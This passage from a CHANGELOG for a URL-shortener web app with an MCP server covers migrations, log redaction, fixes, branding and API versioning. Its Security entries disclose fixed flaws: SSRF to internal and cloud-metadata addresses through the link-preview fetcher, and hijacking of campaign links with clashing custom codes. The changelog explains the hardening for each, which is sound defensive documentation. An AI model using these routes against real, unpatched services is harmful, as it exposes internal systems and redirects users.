  text can't be talked into them.

### Changed — the schema is migrated with Alembic (Phase 3.14.1)
- **Startup runs the migrations instead of `create_all()`**, which only created
  missing tables and never added a column to an existing one. Revisions live in
  `server/migrations/versions/`; `0001` is the baseline, identical to what
  `create_all()` built (compared with `pg_dump`).
- **The existing production database is adopted, not rebuilt**: tables without
  an `alembic_version` get stamped at the baseline, keeping every row.
- **Tasks that boot together don't race**: a PostgreSQL advisory lock, held for
  the migration's transaction, lets one task migrate while the others wait.
- **New PostgreSQL test suite** (`tests/test_phase3141_migrations.py`): empty
  and pre-Alembic databases, a second run, three processes booting at once, and
  a drift check that fails when a model changes without a migration. CI runs it
  against a PostgreSQL 17 service (`--require-postgres`); locally it needs
  `TEST_DATABASE_URL`.
- `scripts/init_database.py` runs the migrations too, so it can't build a schema
  the app would mistake for the baseline.

### Security — database errors leave out the SQL parameters
- **A failed database statement no longer writes the user's input to the log.**
  SQLAlchemy ends a database error's message with the statement's parameters,
  and a traceback prints that message: uvicorn's for an API request, fastmcp's
  for a tool call. So when a statement failed (a lost connection, a timeout, a
  constraint), the log got what the user sent: for `POST /api/v1/auth/register`,
  the email and the password's bcrypt hash; for a campaign, its rows. The engine
  now hides them (`hide_parameters=True`, which covers `echo`'s SQL logging too);
  the statement stays, so the error still says what failed.
- PostgreSQL's own detail for a constraint violation is part of the driver's
  message, so it still names the value: `Key (email)=(…) already exists`, or the
  whole row for a `NOT NULL` violation (`Failing row contains (…)`).

### Security — MCP tool arguments kept out of fastmcp's error log
- **A failed API call no longer writes the tool's arguments to the log.** fastmcp
  logs each failed tool call with its traceback, and when a generated tool's call
  into the API failed, the error carried the API's response body. A `422` body
  echoes each invalid field's value, or the whole request body when a field is
  missing, so a `create_campaign` CSV (names, companies, emails) could reach
  CloudWatch. For an API error the line now keeps the tool and the status, without
  the body or the traceback: `Error calling tool 'create_short_url': HTTP error 422
  (response body not logged)`. The MCP client still gets the whole error, and any
  other exception, including one raised inside the API, still logs its traceback
  (`ApiErrorLogFilter` in `mcp_server/usage.py`).
- **Never run production with `FASTMCP_LOG_LEVEL=DEBUG`**: at that level fastmcp
  logs every tool call's arguments in full. The default, `INFO`, doesn't.

### Added — usage log for MCP tool calls and HTTP requests (Phase 5.6.0)
- **One JSON line per MCP tool call** (`mcp.tool_call`): tool, argument names,
  user id, outcome, error type, HTTP status of a failed API call, duration and
  request id. In the access log every MCP call was a `POST /mcp/`, so nothing
  recorded which tools were used or how they failed; the dogfood (5.6) needs
  those numbers. Argument values are never logged: campaign rows carry personal
  data. Written by a fastmcp middleware (`mcp_server/usage.py`).
- **One JSON line per HTTP request** (`http.request`): method, path without the
  query string, status, duration and request id. It replaces uvicorn's access
  log, now off in the image (`--no-access-log`), and closes the 3.9.6 item "request
  id in log lines".
- **A generated tool's call into the API carries the MCP request's id**, so one id
  links the MCP request, the tool call and the API call behind it.
- Lines go to stderr, since under the stdio transport stdout is the JSON-RPC
  channel. The Logs Insights queries (calls, errors and latency per tool, daily
  users) and the retention setup are in `mcp_server/README.md` § Usage log.

### Fixed — reserved and colliding custom codes
- **Custom codes the app serves itself are treated as taken.** `POST
  /api/v1/urls/custom` accepted `mcp`, `docs` and `redoc`, but `/mcp` redirects
  to the MCP endpoint and `/docs` and `/redoc` serve the API docs, so those short
  links could never resolve. They now get a random suffix and a warning, exactly
  like a taken code (`mcp` → e.g. `mcp4k2`). Only exact matches count (`mcpx`
  and `docs2` are kept), case-insensitively in `loose` mode. The set lives in
  `RESERVED_SHORT_CODES` (`server/utils/url.py`), and a test fails if the app
  serves a single-segment path that isn't in it.
- **A taken code's fallback now honours `SHORT_URL_MODE=loose`.** It was built
  from the raw input, so `PROMO` (with `promo` taken) became `PROMOr09`, which
  resolved at `/PROMOr09` but 404'd at `/promor09`. It is now lowercase.
- **The fallback fits the column and is re-checked.** A taken 18–20 character
  code grew to 21–23 characters, past `short_code`'s `String(20)`, which
  PostgreSQL rejects with a `500`. The base is now trimmed. The suffixed code
  is also checked for availability and redrawn (up to 10 times) instead of
  hitting the per-domain `UNIQUE` constraint.

### Fixed — pagination bounds and N+1 queries
- **`GET /api/v1/urls` and `GET /api/v1/campaigns` enforce their documented page
  size.** `limit` must be 1–100 and `skip` ≥ 0; anything else now returns `422`
  instead of reaching the database (`limit=100000` returned every row, and a
  negative `skip` or `limit` was a PostgreSQL error, i.e. a `500`). Out-of-range
  values are rejected, not clamped: to read more than 100 rows, page with `skip`
  until you have `total`. The bounds are in the OpenAPI schema, so the MCP
  `list_urls` and `list_campaigns` tools advertise them too. The frontend never
  asks for more than 100.
- **Multi-URL endpoints run a constant number of SQL statements** instead of one
  or two more per row (e.g. `GET /api/v1/urls` with 100 tagged URLs: 104 → 5):
  - `GET /api/v1/urls` loads the page's tags in one query;
  - `GET /api/v1/campaigns` loads the page's tags and URL counts in one query each;
  - `POST /api/v1/urls/bulk/tags` and `PATCH /api/v1/campaigns/{id}/tags` load the
    URLs' current tags in one query;
  - `GET /api/v1/analytics/campaigns/{id}/users` (campaign recipients) computes
    every URL's clicks, unique IPs and last click in one grouped query.

### Changed — New logo
- New Shurly logo (custom rounded lettering with a diamond period) and "sy"
  isotype replace the Bricolage wordmark and "s." isotype everywhere: web header,
  footer, auth pages, 404, styleguide, favicons, app icons and the OG card.
- The diamond is Griddo blue on light surfaces and cyan `#3cc3dd` on navy (new
  `brand-cyan` token, logo only). The brand kit in `design/brand/` is regenerated
  from one master geometry: logo in colour, reversed and mono, isotype on navy and
  white tiles, tile-less mark, PNG @1x/2x/3x. Old lime/Bricolage files removed.
- Logo heights grow ~1.35× (header 22→30 px) because the new logo's box includes
  the "y" descender.

### Changed — Griddo palette and type (trial)
- Brand colour is Griddo blue `#5057ff` (was lime `#b8f03e`): new `brand-50…950`
  scale with the signature at `brand-400`. Brand fills now carry white text,
  brand text/icons on ink use `brand-300`, charts draw in `brand-400`. Logo dot,
  favicons, app icons and the OG card are regenerated in blue.
- Page canvas is warm off-white `#faf9f6` (was `#f5f6f8`).
- Ink scale is Griddo navy: `ink-950` `#001b3c`, `ink-900` `#022958`, the rest
  regenerated in the same hue with the same contrast roles (`ink-500` still the
  lightest text, 4.5:1+ on white, canvas and `ink-100`). Logo letters, isotype
  tile, shadows and the modal backdrop follow. Brand marks on `ink-900` use
  `brand-300` (`brand-400` there is 2.8:1).
- Headlines (`.display`) drop from weight 750 to 500: Logical works best light.
- Eyebrows (`.eyebrow`) are handwritten in Shadows Into Light Two (OFL): always
  uppercase (the `font-hand` utility enforces it too), 14 px, tracked 0.05em, brand
  blue (`brand-300` on ink), one weight (was uppercase Inter 12 px in ink-500).
- Interface typeface is Figtree (was Inter). Headlines use Logical, Griddo's
  typeface, when available and fall back to Figtree until its web font files are
  added (was Bricolage Grotesque, which the wordmark SVG still uses).

### Security
- **Campaign links could be taken over with a custom URL.** Campaign URLs were
  stored with a NULL `domain_id`, and standard/custom URL creation only checks
  the default domain for a clashing code. Any user could create a custom URL
  with the code of someone else's campaign link, and because the resolver
  prefers the default-domain row, the campaign link then redirected to the new
  destination. Campaign URLs now live on the default domain and existing ones
  are moved there at startup (see Fixed), so the clash is detected and the
  custom code gets a random suffix, as for any taken code.
- **SSRF hardening for the Open Graph fetcher.** Link previews are fetched
  server-side from user-supplied URLs (`POST /api/v1/urls`,
  `POST /api/v1/urls/custom`, `POST /api/v1/urls/{code}/refresh-preview`, and since
  Phase 3.11 `POST /api/v1/urls/fetch-metadata`), so any
  authenticated user could make the API request internal addresses (loopback,
  RFC 1918, the link-local cloud metadata endpoints `169.254.169.254` /
  `169.254.170.2`) and read page titles and descriptions back.
  `fetch_opengraph_metadata` now:
  - fetches only `http` / `https` URLs;
  - resolves the host and refuses it unless **every** address is globally
    routable: no private, loopback, link-local, reserved, multicast, unspecified
    or shared (`100.64.0.0/10`) addresses, with IPv4-mapped and 6to4 IPv6 forms
    checked as the IPv4 address they carry;
  - connects to the address it checked, while the `Host` header and TLS
    (SNI + certificate verification) keep the hostname, so DNS rebinding can't
    swap in an internal IP after the check;
  - follows redirects manually, re-checking every hop, up to 5 (previously
    httpx's default of 20, unchecked).
  A refused fetch returns empty metadata like any other fetch failure, so URL
  creation never breaks.
- **`OG_FETCH_ALLOW_PRIVATE`** (default `false`) disables the address check so
  local development can preview pages served from `localhost`. Never enable it
  in production.

### Changed
- **API moved under `/api/v1/` prefix.** All routes previously served at
  `/api/...` are now served at `/api/v1/...`. The unversioned path is no
  longer mounted. Clients must update their base URL.
- Frontend API client (`frontend/src/utils/api.ts`) and all dashboard pages
  updated to call the versioned paths.
- `README.md` and `CLAUDE.md` endpoint references updated.

### Added
- `CHANGELOG.md` with explicit API versioning policy.
- **URL validity window and visit cap** (Phase 3.9.2). Three new optional fields
  on the URL model and create/update schemas:
  - `valid_since` (timestamp): URL becomes active at this UTC time. Requests
    before this point return `404 Not Found` (we do not reveal premature URLs).
  - `valid_until` (timestamp): URL stops being active at this UTC time. Requests
    after this point return `410 Gone`.
  - `max_visits` (integer ≥ 1): Hard cap on real human visits. Once the count
    of `Visitor` rows for the URL reaches this value, further requests return
    `410 Gone`. Social-media crawler previews do not consume the quota because
    they don't insert into the `Visitor` table.
  All three fields default to `NULL` (no constraint). Setting any of them in a
  `PATCH /api/v1/urls/{code}` request to `null` clears the constraint.
- **Bot detection in analytics** (Phase 3.9.3). `Visitor.is_bot` is set at log
  time using the existing UA classifier. All analytics endpoints now exclude
  bot visits by default and accept `?include_bots=true` to opt back in.
- **Crawlability + `/robots.txt`** (Phase 3.9.4). New `URL.crawlable` field
  (default `false`); the public `/robots.txt` endpoint emits a default-deny
  policy and `Allow: /<code>` per opted-in URL.
- **GDPR IP anonymization** (Phase 3.9.5). Visitor IPs are truncated to /24
  (IPv4) or /64 (IPv6) at insert time. Toggle via `ANONYMIZE_REMOTE_ADDR=false`
  if a legal review explicitly approves storing full addresses.
- **`X-Request-Id` middleware** (Phase 3.9.6). UUID generated per request
  unless the client supplies one; echoed in response headers for log
  correlation.
- **`SHORT_URL_MODE`** (Phase 3.9.6). Default `loose` — generated codes and
  custom slugs are lowercased so `Abc` and `abc` cannot collide. Set to
  `strict` to preserve case (legacy behavior).
- **`DISABLE_TRACK_PARAM`** (Phase 3.9.6). When the redirect URL contains the
  configured query param (default `nostat`), the redirect still happens but
  no `Visitor` row is inserted. Useful for QA / smoke tests.
- **`TRUSTED_PROXIES`** (Phase 3.9.6). CIDR allowlist for `X-Forwarded-For`
  resolution. Empty by default (never trust the header). Set to your
  ALB/CloudFront/API-Gateway source ranges before relying on it.
- **OG fetcher charset fallback** (Phase 3.9.6 / Shlink #2564). The OG fetcher
  now decodes via `<meta charset>` when the HTTP `Content-Type` does not
  declare one, and falls back to UTF-8 with replacement so a malformed page
  cannot break URL creation.
- **API key scoping data model** (Phase 3.9.6). `User.api_key_scope` enum
  added with `FULL_ACCESS` (only enforced value at launch) plus reserved
  `READ_ONLY`, `CREATE_ONLY`, `DOMAIN_SPECIFIC` for post-launch role rollout
  without a destructive enum migration. `POST /api/v1/auth/api-key/generate`
  now returns `{api_key, scope}`.

### Fixed
- **Campaign URLs are bound to the default domain.** `POST /api/v1/campaigns`
  and the MCP `create_campaign_from_rows` tool left `domain_id` NULL, so:
  - the `(domain_id, short_code)` UNIQUE never covered them (PostgreSQL treats
    NULLs as distinct);
  - the tracking pixel (`/{code}/track`), which matches by domain only,
    returned `404` for every campaign link;
  - the resolver's legacy NULL fallback served them on every host.
  Campaign short codes are now unique per domain, like standard and custom
  codes. `generate_campaign_urls()` takes a required `domain_id`.
- **Two rows of one campaign could get the same short code.** Codes were only
  checked against the database, where the batch isn't yet, so the odds grew
  with the CSV (about 2% at 10,000 rows, 44% at 50,000). Both recipients got
  the same link, which resolved to one of the two rows, so one of them landed
  on a URL personalized with the other's data. The generator now skips codes
  it already issued in the batch.
- **Existing campaign URLs are repaired at startup.** `_seed_database()` runs
  `backfill_campaign_url_domains()`, which moves NULL-domain campaign URLs to
  the default domain. It is idempotent and keeps `updated_at`. A row whose move
  would violate the UNIQUE (its code is already taken on the default domain,
  or another NULL-domain row shares it) stays NULL and keeps resolving through
  the legacy fallback; startup logs a warning with the count. To review them:
  ```sql
  SELECT id, short_code, campaign_id, created_by, created_at
  FROM urls
  WHERE domain_id IS NULL AND url_type = 'CAMPAIGN'
  ORDER BY short_code;
  ```
  `url_type` stores enum member names, so the literal is `'CAMPAIGN'`;
  `'campaign'` fails with `invalid input value for enum urltype`.
- bcrypt 5.0 strict 72-byte input limit handled in `hash_password` /
  `verify_password` by pre-truncating at the byte boundary; runtime dependency
  pinned to `bcrypt<5` until passlib ships an upstream fix.
- `Jinja2Templates.TemplateResponse` migrated to the new positional `request`
  signature (Starlette removed the legacy form).
- Test-suite assertions updated for FastAPI's switch from `403` to `401` when
  `HTTPBearer` credentials are missing.

### Added (Phase 3.10 — Shlink Lessons, Medium Priority)
- **Multi-domain foundation** (3.10.1). New `Domain` model (`hostname`,
  `is_default`); `URL.domain_id` FK; UNIQUE constraint moved from
  `short_code` to `(domain_id, short_code)` so the same code may exist on
  different hosts. The redirect resolver picks the domain from the request
  `Host` header, falling back to the seeded default domain. Default domain
  is configurable via `DEFAULT_DOMAIN` (default `shurl.griddo.io`) and is
  seeded at app startup. Domain management UI is intentionally deferred —
  single-domain at launch.
- **Dynamic redirect rules** (3.10.2). New `RedirectRule` model with a
  JSONB `conditions` column evaluated in priority order (first match wins).
  Supported condition types: `device` (ios/android/desktop/linux/windows/macos),
  `language` (Accept-Language primary subtag), `query_param`, `before_date`,
  `after_date`, `browser`. Conditions inside a single rule AND together;
  unknown types fail closed. CRUD endpoints under `/api/v1/urls/{code}/rules`.
  Rules evaluate before campaign param injection so personalization still
  applies on top of the chosen target.
- **Email tracking pixel** (3.10.3). `GET /{code}/track` returns the canonical
  43-byte 1×1 transparent GIF with `Cache-Control: no-store`. Pixel hits land
  in the existing `visits` table with `is_pixel=true` (timeline-aligned with
  clicks) and are excluded from click analytics by default.
- **Orphan visits** (3.10.4). New `OrphanVisit` model captures requests that
  hit the redirect path but don't resolve. Type enum: `base_url`,
  `invalid_short_url`, `regular_404` (reserved). Listed via
  `GET /api/v1/analytics/orphan-visits` (auth required).
- **CSV export** (3.10.5). Streaming CSV via `csv.writer` + Starlette
  `StreamingResponse`. Available on URL daily/weekly stats, geo distribution
  and campaign users (`user_data` flattened into columns) using
  `?format=csv`. Default response remains JSON.
- **Configurable redirect behavior** (3.10.6). `REDIRECT_STATUS_CODE`
  (default `302`, accepts `301/302/307/308`) and `REDIRECT_CACHE_LIFETIME`
  (default `0`, emits `private, max-age=0`; positive values emit
  `public, max-age=N`). Settings validate up-front so a typo at deploy time
  fails fast.

### Added (Phase 3.11 — Brand & frontend redesign)
- **Brand identity**: wordmark with the lime "click dot", "s." isotype,
  horizontal/vertical lockups, favicon pack and OG card
  (`design/brand/`, usage in `design/brand/README.md`).
- **Design system**: Tailwind 4 `@theme` tokens (ink + lime scales, type,
  radius, elevation, motion), component classes and patterns, documented in
  `design/DESIGN_SYSTEM.md` and rendered live at `/styleguide/`.
- **Every screen rebuilt** to the UX brief: landing with pricing, login,
  register, 404, links dashboard (quick create with auto-copy, search, type
  filter, tag chips, bulk tag/copy), full link editor with live social
  preview, link details (clicks chart + table, countries, social preview,
  email pixel, smart redirects), campaigns list, 4-step campaign wizard,
  campaign details (opens, recipients, exports), analytics (7-day view,
  typo'd links), settings (account, API & MCP, tags, notifications, plan).
- `GET /api/v1/urls/{short_code}`: fetch one URL.
- `POST /api/v1/urls/fetch-metadata`: OG title/description/image for any
  destination (auth required), used by the live preview.
- `GET /api/v1/urls`: `q` (case-insensitive search over code, title and
  destination) and repeatable `url_type` filters.
- `URLResponse` gains `click_count` (bots and pixel opens excluded),
  `campaign_id` and `user_data`.
- Analytics overview `top_urls` items gain `short_url` and `title`.
- `GET /api/v1/campaigns/{id}` now includes the campaign's `tags`.
- MCP tools `get_url` and `fetch_url_metadata`.

### Changed (Phase 3.11)
- Frontend is a **fully static build**: `@astrojs/node` removed. The link and
  campaign detail pages moved from `/dashboard/urls/[short_code]` and
  `/dashboard/campaigns/[id]` to `/dashboard/link/?code=…` and
  `/dashboard/campaign/?id=…`.
- Analytics overview `top_urls` no longer counts tracking-pixel opens as
  clicks, even with `include_bots=true`.
- Default `CORS_ORIGINS` includes the frontend dev server
  (`http://localhost:4232`).

### Changed — Astro 7
- Frontend upgraded to **Astro 7.3.4** (Vite 8, Rust compiler) with
  `@tailwindcss/vite`/`tailwindcss` 4.3.3 and `@astrojs/check` 0.9.10.
  Requires Node.js ≥ 22.12. The `vite ^7.3.2` npm override was removed
  (Astro 7 needs Vite ≥ 8.0.13); `npm audit` is clean.
- Astro 7 compresses HTML with JSX whitespace rules (`compressHTML: 'jsx'`).
  Three styleguide templates relied on a line break for a space and now use
  an explicit `{' '}`. Every page's rendered text and screenshots (1440 and
  390 px) were compared against the Astro 6 build and match.

### Frontend
- Astro 4 → 6 upgrade. `@astrojs/tailwind` (deprecated for Astro ≥ 5)
  replaced with `@tailwindcss/vite` + Tailwind 4 (CSS-first config in
  `src/styles/global.css`). `@astrojs/node` adapter added to support the
  three client-rendered dynamic dashboard routes that Astro 5+ no longer
  permits without `getStaticPaths()`. `npm audit` is now clean
  (0 vulnerabilities).

### Notes
- The redirect endpoint at root level (`/{short_code}`) is intentionally
  unversioned — short URLs are public-facing and must remain stable.
- AWS SAM template (`template.yaml`) requires no changes: the API Gateway
  uses a catch-all `/{proxy+}` route that forwards everything to the
  FastAPI app, which now mounts under `/api/v1/`.
